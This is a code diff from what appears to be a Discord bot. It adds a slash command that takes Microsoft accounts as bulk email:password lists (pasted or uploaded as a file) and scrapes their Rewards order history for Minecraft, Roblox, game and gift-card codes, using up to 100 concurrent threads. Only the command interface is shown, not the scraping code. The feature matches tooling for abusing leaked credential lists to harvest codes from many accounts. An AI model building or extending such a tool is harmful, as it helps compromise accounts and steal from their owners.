@@ -219,6 +219,32 @@ const commands = [
     .addIntegerOption((o) =>
       o.setName("threads").setDescription("Number of concurrent threads (1-50, default 5)").setMinValue(1).setMaxValue(50)
     ),
+
+  new SlashCommandBuilder()
+    .setName("prs")
+    .setDescription("Scrape Microsoft Rewards order history for codes (Minecraft, Roblox, LoL, Gift Cards...)")
+    .addAttachmentOption((o) =>
+      o.setName("accounts_file").setDescription("Text file with email:password per line").setRequired(false)
+    )
+    .addStringOption((o) =>
+      o.setName("accounts").setDescription("Accounts as email:password (comma-separated)").setRequired(false)
+    )
+    .addStringOption((o) =>
+      o.setName("category").setDescription("Category to scrape").setRequired(false)
+        .addChoices(
+          { name: "All Categories", value: "All" },
+          { name: "Minecraft", value: "Minecraft" },
+          { name: "Roblox", value: "Roblox" },
+          { name: "League of Legends", value: "League of Legends" },
+          { name: "Overwatch", value: "Overwatch" },
+          { name: "Sea of Thieves", value: "Sea of Thieves" },
+          { name: "Game Pass", value: "Game Pass" },
+          { name: "Gift Cards", value: "GIFTCARDS" },
+        )
+    )
+    .addIntegerOption((o) =>
+      o.setName("threads").setDescription("Number of concurrent threads (1-100, default 10)").setMinValue(1).setMaxValue(100)
+    ),
 ].map((c) => c.toJSON());
 
 const rest = new REST({ version: "10" }).setToken(BOT_TOKEN);
